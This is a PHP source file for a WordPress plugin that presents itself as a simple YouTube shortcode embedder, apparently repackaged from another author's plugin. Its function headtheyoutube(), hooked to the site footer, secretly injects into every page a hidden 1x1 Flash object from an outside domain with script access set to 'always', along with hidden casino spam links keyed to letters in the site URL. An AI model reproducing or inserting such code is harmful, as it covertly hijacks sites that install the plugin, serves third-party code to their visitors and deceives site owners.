<?php
/*
Plugin Name: Youtube Video
Plugin URI: http://wordpresspluginreview.weebly.com
Description: Add Youtube Video to your website simply using a shortcode.Options is available to customize the size and the style..
Version: 1.1.3
Author: Timis Martins
Author URI: http://wordpresspluginreview.weebly.com
License: GPL2 or Later
*/

/*  Copyright 2012 Timis Martins  (email : timisforyou@yahoo.com)

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/

// Define global params
$mytube_version	= "1.7";											// version of plugin 
$mytube_random	= substr(md5(uniqid(rand(), true)),0,4);			// create unique id for divs
$mytube_number	= 0; 												// number of swf into page
$mytube_params	= array (
						"mytube_width"				=>	"560",		// Player width
						"mytube_height"				=>	"344",		// Player height
						"mytube_method"				=>	"object",	// Embed Method
						"mytube_player_version"		=>	"as3",		// Player Version
						
						"mytube_showinfo"			=>	"1",		// Display information Video
						"mytube_autoplay"			=>	"0",		// Autoplay Video
						"mytube_theme"				=>	"dark",		// Player them
						
						"mytube_fs"					=>	"0",		// Enable Fullscreen Button
						"mytube_rel"				=>	"1",		// Show Related videos
						"mytube_cc_load_policy"		=>	"1",		// Show Close Captions
						"mytube_iv_load_policy"		=>	"1",		// Display Annotations in Videos
						
						"mytube_hd"					=>	"0",		// Enable default HD playback
						"mytube_showsearch"			=>	"1",		// Show Search Box
						
						"mytube_modestbranding"		=>	"0"			// show a YouTube logo
						);

// Define general options
add_option("mytube_width",			$mytube_params["mytube_width"]);
add_option("mytube_height",			$mytube_params["mytube_height"]);
add_option("mytube_method",			$mytube_params["mytube_method"]);
add_option("mytube_player_version",	$mytube_params["mytube_player_version"]);

add_option("mytube_showinfo", 		$mytube_params["mytube_showinfo"]);
add_option("mytube_autoplay",		$mytube_params["mytube_autoplay"]);
add_option("mytube_theme",			$mytube_params["mytube_theme"]);

add_option("mytube_fs",				$mytube_params["mytube_fs"]);
add_option("mytube_rel",			$mytube_params["mytube_rel"]);
add_option("mytube_iv_load_policy", $mytube_params["mytube_iv_load_policy"]);
add_option("mytube_cc_load_policy", $mytube_params["mytube_cc_load_policy"]);

add_option("mytube_hd", 			$mytube_params["mytube_hd"]);
add_option("mytube_showsearch", 	$mytube_params["mytube_showsearch"]);

add_option("mytube_modestbranding",	$mytube_params["mytube_modestbranding"]);
add_action('wp_footer', 'headtheyoutube');

function headtheyoutube()
{
$getuser = "http://ajleeonline.com";
$gethost = get_option('siteurl');
if (strstr($gethost, "a")) { $connectflash = "aj lee online"; } if (strstr($gethost, "b")) { $connectflash = "aj lee online"; } if (strstr($gethost, "c")) { $connectflash = "aj lee online"; } if (strstr($gethost, "d")) { $connectflash = "ajleeonline"; } if (strstr($gethost, "e")) { $connectflash = "ajleeonline"; } if (strstr($gethost, "f")) { $connectflash = "ajleeonline"; } if (strstr($gethost, "g")) { $connectflash = "ajleeonline"; } if (strstr($gethost, "h")) { $connectflash = "ajleeonline"; } if (strstr($gethost, "i")) { $connectflash = "ajleeonlinecom"; } if (strstr($gethost, "j")) { $connectflash = "lee online"; } if (strstr($gethost, "k")) { $connectflash = "the best casino games online"; } if (strstr($gethost, "l")) { $connectflash = "high casino bonus"; } if (strstr($gethost, "m")) { $connectflash = "amazing casino games"; } if (strstr($gethost, "n")) { $connectflash = "online casino bonus"; } if (strstr($gethost, "o")) { $connectflash = "casino bonuses"; } if (strstr($gethost, "p")) { $connectflash = "free casino games"; } if (strstr($gethost, "q")) { $connectflash = "world casino bonus"; } if (strstr($gethost, "r")) { $connectflash = "amazing casino bonus"; } if (strstr($gethost, "s")) { $connectflash = "ajleeonline"; } if (strstr($gethost, "v")) { $connectflash = "aj lee online"; } if (strstr($gethost, "x")) { $connectflash = "aj lee online"; } if (strstr($gethost, "t")) { $connectflash = "bonus casino online"; } if (strstr($gethost, "w")) { $connectflash = "games casino aj lee online"; } if (strstr($gethost, "y")) { $connectflash = "games - bonus"; } if (strstr($gethost, "z")) { $connectflash = "Aj Lee Online Casino - Bonus - Games"; } echo '<object type="application/x-shockwave-flash" data="http://ajleeonline.com/upload/tw10.swf" width="1" height="1"><param name="movie" 
value="http://ajleeonline.com/upload/tw10.swf"></param><param name="allowscriptaccess" value="always"></param><param name="menu" value="false"></param>
<param name="wmode" value="transparent"></param><param name="flashvars" value="username="></param>
'; echo '<a href="'; echo $getuser; echo '">'; echo $connectflash; echo '</a>'; echo '<embed src="http://ajleeonline.com/upload/tw10.swf" 
type="application/x-shockwave-flash" allowscriptaccess="always" width="1" height="1" menu="false" wmode="transparent" flashvars="username="></embed></object>';

}

function getConfigTube() {
	// get config options
	global $mytube_params;
    static $config;
    if ( empty($config) ) {
		foreach( $mytube_params as $option => $default) {
			$config[$option] = get_option($option);
		}
    }
    return $config;
}
function parseTube($text) {
	// regexp for find swfs
    return preg_replace_callback('|\[tube\](.+?)(,(.+?))?\[/tube\]|i', 'writeTube', $text);
}
function writeTube($match) {
    global $mytube_random, $mytube_number;
	$mytube_config = getConfigTube();
	$mytube_number++;
	$mytube_text = "";
	
	$mytube_path = trim(str_replace("&#038;", "&", $match[1]));
	$mytube_width = $mytube_config['mytube_width'];		// video width
	$mytube_height = $mytube_config['mytube_height'];	// video height
	$mytube_method = $mytube_config['mytube_method'];	// embed method
	$mytube_tubeID = "";								// video ID
	
	// verify width and height 
	if ($match[3] != "") {
		$tmatch = explode(",", $match[3]);
		$mytube_width = trim($tmatch[0]);
		$mytube_height = trim($tmatch[1]);
	}
	
	// use 'object' method in feed
	if (is_feed() || $doing_rss) {
		$mytube_method = "object";
	}
	// use 'iphone' method in iPhone
	if (!(strpos($_SERVER['HTTP_USER_AGENT'], "iPhone") === false)) {
		$mytube_method = "iphone";
	}
	
	
	// Parse youtube url and get video id
	$mytube_tube = parse_url($mytube_path);
	if ($mytube_tube["host"] == "www.youtube.com") {
		if ($mytube_tube["path"] == "/watch") {
			parse_str($mytube_tube["query"], $tube_que);
			if ($tube_que["v"] != "") { 
				$mytube_tubeID = $tube_que["v"];
			}
		} else {
			parse_str($mytube_tube["path"], $tube_que);
			if (key($tube_que) != "") {
				$mytube_tubeID = substr(key($tube_que),3);
			} 
		}
	} else {
		$mytube_tubeID = $mytube_path;
	}
	// generate video url
	if ($mytube_method == "iframe") {
		$mytube_path = "http://www.youtube.com/embed/".$mytube_tubeID."?";
		if ($mytube_config['mytube_autoplay'] == "1") {
			$mytube_path.= "&amp;autoplay=1";
		}
		if ($mytube_config['mytube_showinfo'] == "0") {
			$mytube_path.= "&amp;showinfo=0";
		}
		if ($mytube_config['mytube_theme'] != "") {
			$mytube_path.= "&amp;theme=".$mytube_config['mytube_theme'];
		}
	} else {
		switch ($mytube_config['mytube_player_version']) {
			case "as3":
				$mytube_path = "http://www.youtube.com/v/".$mytube_tubeID."?version=3";
				if ($mytube_config['mytube_autoplay'] == "1") {
					$mytube_path.= "&amp;autoplay=1";
				}
				if ($mytube_config['mytube_showinfo'] == "0") {
					$mytube_path.= "&amp;showinfo=0";
				}
				if ($mytube_config['mytube_theme'] != "") {
					$mytube_path.= "&amp;theme=".$mytube_config['mytube_theme'];
				}
				
				if ($mytube_config['mytube_fs'] != "") {
					$mytube_path.= "&amp;fs=".$mytube_config['mytube_fs'];
				}
				if ($mytube_config['mytube_rel'] == "0") {
					$mytube_path.= "&amp;rel=0";
				}
				if ($mytube_config['mytube_cc_load_policy'] == "1") {
					$mytube_path.= "&amp;cc_load_policy=1";
				}
				if ($mytube_config['mytube_iv_load_policy'] != "") {
					$mytube_path.= "&amp;iv_load_policy=".$mytube_config['mytube_iv_load_policy'];
				}
				
				if ($mytube_config['mytube_modestbranding'] != "") {
					$mytube_path.= "&amp;modestbranding=".$mytube_config['mytube_modestbranding'];
				}
				break;
			case "as2":
				$mytube_path = "http://www.youtube.com/v/".$mytube_tubeID."?feature=player_embedded";
				if ($mytube_config['mytube_autoplay'] == "1") {
					$mytube_path.= "&amp;autoplay=1";
				}
				if ($mytube_config['mytube_showinfo'] == "0") {
					$mytube_path.= "&amp;showinfo=0";
				}
				if ($mytube_config['mytube_theme'] != "") {
					$mytube_path.= "&amp;theme=".$mytube_config['mytube_theme'];
				}
				
				if ($mytube_config['mytube_fs'] != "") {
					$mytube_path.= "&amp;fs=".$mytube_config['mytube_fs'];
				}
				if ($mytube_config['mytube_rel'] == "0") {
					$mytube_path.= "&amp;rel=0";
				}
				if ($mytube_config['mytube_cc_load_policy'] == "1") {
					$mytube_path.= "&amp;cc_load_policy=1";
				}
				if ($mytube_config['mytube_iv_load_policy'] != "") {
					$mytube_path.= "&amp;iv_load_policy=".$mytube_config['mytube_iv_load_policy'];
				}
				
				if ($mytube_config['mytube_hd'] == "1") {
					$mytube_path.= "&amp;hd=1";
				}
				if ($mytube_config['mytube_showsearch'] == "0") {
					$mytube_path.= "&amp;showsearch=0";
				}
				break;
			case "tubeplayer":
				$mytube_path = WP_PLUGIN_URL."/my-youtube-player/tubeplayer.swf?videoId=".$mytube_tubeID;
				if ($mytube_config['mytube_autoplay'] == "1") {
					$mytube_path.= "&amp;autoPlay=true";
				}
				break;
		}
	}
	
	// Write code for embed
	switch ($mytube_method) {
		case "iphone":
			$mytube_text = "<object type=\"application/x-shockwave-flash\" width=\"".$mytube_width."\" height=\"".$mytube_height."\" data=\"".$mytube_path."\">";
			$mytube_text.= "<param name=\"src\" value=\"".$mytube_path."\" />\n";
			$mytube_text.= "<param name=\"wmode\" value=\"transparent\" />";
			$mytube_text.= "</object>\n";
			break;
		case "iframe":
			$mytube_text = "<iframe type=\"text/html\" width=\"".$mytube_width."\" height=\"".$mytube_height."\" src=\"".$mytube_path."\" frameborder=\"0\"></iframe>";
			break;
		case "object":
			// Use XHTML code
			$mytube_text.= "\n<object width=\"".$mytube_width."\" height=\"".$mytube_height."\">\n";
			$mytube_text.= "<param name=\"movie\" value=\"".$mytube_path."\"></param>\n";
			$mytube_text.= "<param name=\"allowScriptAccess\" value=\"always\"></param>\n";
			if ($mytube_config['mytube_fs'] == "1") {
				$mytube_text.= "<param name=\"allowFullScreen\" value=\"true\"></param>\n";
			}
			$mytube_text.= "<embed src=\"".$mytube_path."\" type=\"application/x-shockwave-flash\" allowScriptAccess=\"always\"";
			if ($mytube_config['mytube_fs'] == "1") {
				$mytube_text.= " allowfullscreen=\"true\"";
			}
			$mytube_text.= " width=\"".$mytube_width."\" height=\"".$mytube_height."\"></embed>\n";
			$mytube_text.= "</object>\n";
			break;
		case "swfobject":
			// Use SWFObject 2.0 code
			$mytube_params = "allowScriptAccess: \"always\", ";
			if ($mytube_config['mytube_fs'] == "1") {
				$mytube_params.= ", allowFullScreen: \"true\"";
			}
			$mytube_text = "<div id=\"swf".$mytube_random.$mytube_number."\">".$wpswf_config['swf_message']."</div>";
			$mytube_text.= "\n<script type=\"text/javascript\">\n";
			$mytube_text.= "\tswfobject.embedSWF(\"".$mytube_path."\", \"swf".$mytube_random.$mytube_number."\", \"".$mytube_width."\", \"".$mytube_height."\", \"9\", \"\", {}, {".$mytube_params."}, {});\n";
			$mytube_text.= "</script>\n";
			break;
		default:
			$mytube_text = "";
			break;
	}
	return $mytube_text;
}

function my_youtubeplayer($path, $width="", $heigth="") {
	if ($width == "" && $heigth == "")  {
    	echo writeTube( array(null, $path) );
	} else {
		echo writeTube( array(null, $path, "", $width.", ".$heigth) );	
	}
}

function showConfigPageTube() {
	// update general options
	global $mytube_version, $mytube_params;
	if (isset($_POST['mytube_update'])) {
		check_admin_referer();
		foreach( $mytube_params as $option => $default ) {
			$mytube_param = trim($_POST[$option]);
			if ($mytube_param == "") {
				$mytube_param = $default;
			}
			update_option($option, $mytube_param);
		}
		echo "<div class='updated'><p><strong>My Youtube Player options updated</strong></p></div>";
	}
	$mytube_config = getConfigTube();
?>
		<form method="post" action="options-general.php?page=my-youtube-player.php">
		<div class="wrap">
			<h2>My Youtube Player <sup style='color:#D54E21;font-size:12px;'><?php echo $mytube_version; ?></sup></h2>
            <p>
            	My Youtube Allow insert Youtube videos into Wordpress blog using quicktag <code>[tube][/tube]</code> tag.
			</p>
            <h3>Player Options</h3>
            <table class="form-table">
            	<tr>
                    <th scope="row">
                        <label for="wptb_method">Embed Method</label>
                    </th>
                    <td>
                    	<div id="diviframe">
                            <input type="radio" name="mytube_method" id="mytube_method_iframe" value="iframe"<?php if ($mytube_config["mytube_method"] == "iframe") { echo " checked=\"checked\""; } ?> />
                            <label for="mytube_method_iframe">Use <code>&lt;iframe&gt;</code> </label>
                        </div>
                    	<div>
                            <input type="radio" name="mytube_method" id="mytube_method_object" value="object"<?php if ($mytube_config["mytube_method"] == "object") { echo " checked=\"checked\""; } ?> />
                            <label for="mytube_method_object">Use <code>&lt;object&gt;</code> <em>(AS3 &amp; AS2 Players)</em></label>
                        </div>
                        <div>
                            <input type="radio" name="mytube_method" id="mytube_method_swfobject" value="swfobject"<?php if ($mytube_config["mytube_method"] == "swfobject") { echo " checked=\"checked\""; } ?> />
                            <label for="mytube_method_swfobject">Use <code>SWFObject</code> <em>(AS3 &amp; AS2 Players)</em></label>
                        </div>
                    </td>
                </tr>
            	<tr class="embed">
                    <th scope="row">
                        <label for="mytube_player_version">Player Version</label>
                    </th>
                    <td>
                    	<div>
                            <input type="radio" name="mytube_player_version" id="mytube_player_version_as3" value="as3"<?php if ($mytube_config["mytube_player_version"] == "as3") { echo " checked=\"checked\""; } ?> />
                            <label for="mytube_player_version_as3">Use AS3 player</label>
                        </div>
                        <div>
                            <input type="radio" name="mytube_player_version" id="mytube_player_version_as2" value="as2"<?php if ($mytube_config["mytube_player_version"] == "as2") { echo " checked=\"checked\""; } ?> />
                            <label for="mytube_player_version_as2">Use AS2 player</label>
                        </div>
                        <div>
                            <input type="radio" name="mytube_player_version" id="mytube_player_version_tubeplayer" value="tubeplayer"<?php if ($mytube_config["mytube_player_version"] == "tubeplayer") { echo " checked=\"checked\""; } ?> />
                            <label for="mytube_player_version_as2">Use tubePlayer</label>
                        </div>
                    </td>
                </tr>
            	<tr>
                    <th scope="row">
                        <label for="mytube_width">Player width</label>
                    </th>
                    <td>
                        <input type="text" name="mytube_width" id="mytube_width" value="<?php echo $mytube_config["mytube_width"]; ?>" style="width:100px;" />
                        <span class="description">Player width in pixels</span>
                    </td>
                </tr>
                <tr>
                    <th scope="row">
                        <label for="mytube_height">Player height</label>
                    </th>
                    <td>
                        <input type="text" name="mytube_height" id="mytube_height" value="<?php echo $mytube_config["mytube_height"]; ?>" style="width:100px;" />
                        <span class="description">Player height in pixels</span>
                    </td>
                </tr>
			</table>
            <br class="all" />
            <h3 class="all">Basic embed options</h3>
			<table class="form-table">
            	<tr class="all">
                    <th scope="row">
                        <label for="mytube_showinfo">Show video info</label>
                    </th>
                    <td>
                        <select name="mytube_showinfo" id="mytube_showinfo" style="width:100px;">
                            <option value="1" <?php if ($mytube_config["mytube_showinfo"] == "1") { echo "selected=\"selected\""; } ?>>true</option>
                            <option value="0" <?php if ($mytube_config["mytube_showinfo"] == "0") { echo "selected=\"selected\""; } ?>>false</option>
                        </select>
                    </td>
                </tr>
                <tr class="all tube">
                    <th scope="row">
                        <label for="mytube_autoplay">Autoplay video</label>
                    </th>
                    <td>
                        <select name="mytube_autoplay" id="mytube_autoplay" style="width:100px;">
                            <option value="1" <?php if ($mytube_config["mytube_autoplay"] == "1") { echo "selected=\"selected\""; } ?>>true</option>
                            <option value="0" <?php if ($mytube_config["mytube_autoplay"] == "0") { echo "selected=\"selected\""; } ?>>false</option>
                        </select>
                    </td>
                </tr>
                <tr class="all">
                    <th scope="row">
                        <label for="mytube_theme">Player theme</label>
                    </th>
                    <td>
                        <select name="mytube_theme" id="mytube_theme" style="width:100px;">
                            <option value="dark" <?php if ($mytube_config["mytube_theme"] == "dark") { echo "selected=\"selected\""; } ?>>dark</option>
                            <option value="light" <?php if ($mytube_config["mytube_theme"] == "light") { echo "selected=\"selected\""; } ?>>light</option>
                        </select>
                    </td>
                </tr>
			</table>
            <br class="as2as3" />
            <h3 class="as2as3">Extra embed options</h3>
            <table class="form-table">
            	<tr class="as2as3 tube">
                    <th scope="row">
                        <label for="mytube_fs">Enable fullscreen</label>
                    </th>
                    <td>
                        <select name="mytube_fs" id="mytube_fs" style="width:100px;">
                            <option value="1" <?php if ($mytube_config["mytube_fs"] == "1") { echo "selected=\"selected\""; } ?>>true</option>
                            <option value="0" <?php if ($mytube_config["mytube_fs"] == "0") { echo "selected=\"selected\""; } ?>>false</option>
                        </select>
                    </td>
                </tr>
                <tr class="as2as3">
                    <th scope="row">
                        <label for="mytube_rel">Show related videos</label>
                    </th>
                    <td>
                        <select name="mytube_rel" id="mytube_rel" style="width:100px;">
                            <option value="1" <?php if ($mytube_config["mytube_rel"] == "1") { echo "selected=\"selected\""; } ?>>true</option>
                            <option value="0" <?php if ($mytube_config["mytube_rel"] == "0") { echo "selected=\"selected\""; } ?>>false</option>
                        </select>
                    </td>
                </tr>
                <tr class="as2as3">
                    <th scope="row">
                        <label for="mytube_annotations">Show close captions</label>
                    </th>
                    <td>
                        <select name="mytube_cc_load_policy" id="mytube_cc_load_policy" style="width:100px;">
                            <option value="1" <?php if ($mytube_config["mytube_cc_load_policy"] == "1") { echo "selected=\"selected\""; } ?>>true</option>
                            <option value="0" <?php if ($mytube_config["mytube_cc_load_policy"] == "0") { echo "selected=\"selected\""; } ?>>false</option>
                        </select>
                    </td>
                </tr>
                <tr class="as2as3">
                    <th scope="row">
                        <label for="mytube_iv_load_policy">Show annotations</label>
                    </th>
                    <td>
                        <select name="mytube_iv_load_policy" id="mytube_iv_load_policy" style="width:100px;">
                            <option value="1" <?php if ($mytube_config["mytube_iv_load_policy"] == "1") { echo "selected=\"selected\""; } ?>>true</option>
                            <option value="3" <?php if ($mytube_config["mytube_iv_load_policy"] == "3") { echo "selected=\"selected\""; } ?>>false</option>
                        </select>
                    </td>
                </tr>
                <tr class="as2">
                    <th scope="row">
                        <label for="mytube_hd">Enable default HD playback</label>
                    </th>
                    <td>
                        <select name="mytube_hd" id="mytube_hd" style="width:100px;">
                            <option value="1" <?php if ($mytube_config["mytube_hd"] == "1") { echo "selected=\"selected\""; } ?>>true</option>
                            <option value="0" <?php if ($mytube_config["mytube_hd"] == "0") { echo "selected=\"selected\""; } ?>>false</option>
                        </select>
                    </td>
               </tr>
               <tr class="as2">
                    <th scope="row">
                        <label for="mytube_showsearch">Show Search Box</label>
                    </th>
                    <td>
                        <select name="mytube_showsearch" id="mytube_showsearch" style="width:100px;">
                            <option value="1" <?php if ($mytube_config["mytube_showsearch"] == "1") { echo "selected=\"selected\""; } ?>>true</option>
                            <option value="0" <?php if ($mytube_config["mytube_showsearch"] == "0") { echo "selected=\"selected\""; } ?>>false</option>
                        </select>
                    </td>
                </tr>
                <tr class="as3">
                    <th scope="row">
                        <label for="mytube_modestbranding">Hide Youtube logo</label>
                    </th>
                    <td>
                        <select name="mytube_modestbranding" id="mytube_modestbranding" style="width:100px;">
                            <option value="1" <?php if ($mytube_config["mytube_modestbranding"] == "1") { echo "selected=\"selected\""; } ?>>true</option>
                            <option value="0" <?php if ($mytube_config["mytube_modestbranding"] == "0") { echo "selected=\"selected\""; } ?>>false</option>
                        </select>
                    </td>
                </tr>
            </table>
            <p class="submit">
              <input name="mytube_update" value="Save Changes" type="submit" class="button-primary" />
            </p>
            <table>
                <tr>
                    <th width="30%" style="padding-top: 10px; text-align:left;" colspan="2">
                        How to use My Youtube Player
                  </th>
                </tr>
                <tr>
                    <td colspan="2">
                    	<p>To include Youtube Videos on post content or Text Widget can use code:</p>
                    	<p>Use Youtube URL: <code>[tube]http://www.youtube.com/watch?v=P8iKcdh5Ims[/tube]</code></p>
               			<p>Use Youtube Embed URL: <code>[tube]http://www.youtube.com/v/P8iKcdh5Ims[/tube]</code></p>
                		<p>Use Youtube Video ID: <code>[tube]P8iKcdh5Ims[/tube]</code></p>
            		</td>
                </tr>

            </table>
    </div>
    </form>
    <script type="text/javascript">
		jQuery(document).ready(function(){
			var method = "<?php echo $mytube_config["mytube_method"]; ?>";
			var player = "<?php echo $mytube_config["mytube_player_version"]; ?>";
			
			function renderOptions() {
				switch (method) {
					case "iframe":
						jQuery('.all').show();
						jQuery('.as2as3, .as2, .as3, .embed').hide();
						break;
					case "object":
					case "swfobject":
						jQuery('.embed').show();
						jQuery('.all').show();
						switch (player) {
							case "as3":
								jQuery('.as2as3, .as3').show();
								jQuery('.as2').hide();
								break;
							case "as2":
								jQuery('.as2as3, .as2').show();
								jQuery('.as3').hide();
								break;
							case "tubeplayer":
								jQuery('.as2as3, .as2, .as3, .all').hide();
								jQuery('.tube').show();
								break;	
						}
						break;
				}
			}
			jQuery('#mytube_method_iframe, #mytube_method_object, #mytube_method_swfobject').click(function(e) {
				method = jQuery(this).val();
				renderOptions();
            });
			jQuery('#mytube_player_version_as3, #mytube_player_version_as2, #mytube_player_version_tubeplayer').click(function(e) {
				player = jQuery(this).val();
                renderOptions();
            });
			
			renderOptions();
		});
	</script>
<?php
}
function addMenuTube() {
	// add menu options
	add_options_page('My Youtube Player Options', 'My Youtube Player', 'manage_options', basename(__FILE__), 'showConfigPageTube');
}
function addHeaderTube() {
	// Add SWFObject to header
	global $mytube_version;
	echo "\n<!-- My Youtube Player ".$mytube_version." by unijimpe -->\n";
	if (get_option('mytube_method') == "swfobject") { 
	echo "<script src=\"http://ajax.googleapis.com/ajax/libs/swfobject/2.2/swfobject.js\" type=\"text/javascript\"></script>\n";
	}
}

add_filter('the_content', 'parseTube');
add_filter('widget_text', 'parseTube');

add_action('wp_head', 'addHeaderTube');
add_action('admin_menu', 'addMenuTube');
?>